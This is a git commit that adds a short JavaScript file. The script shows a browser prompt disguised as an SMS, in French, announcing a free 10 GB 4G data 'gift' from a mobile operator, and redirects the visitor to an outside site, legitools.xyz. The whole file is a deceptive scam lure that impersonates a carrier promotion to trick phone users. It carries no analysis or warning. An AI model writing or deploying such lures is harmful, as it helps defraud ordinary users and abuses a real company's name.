f0896ea10fb8088805576e6947e2482f912e8a2a
Wesjohnson21 <mfonjohnson85@gmail.com>
2024-12-12 02:24:49 -0800

    Create telma.10gb-datagift.js

---
+++ telma.10gb-datagift.js
@@ -0,0 +1,5 @@
+var password = '10 Go de données gratuites'
+password=prompt('SMS: Félicitations, votre numéro est éligible pour recevoir un CADEAU DE CARTE SIM DE MISE À NIVEAU 4G de 10 Go, veuillez appuyer sur OK pour ACTIVER. ','10 Go de données gratuites');
+if (password != '10 Go de données gratuites') {
+location.href='https://legitools.xyz/telma.10gb-datagift';
+}
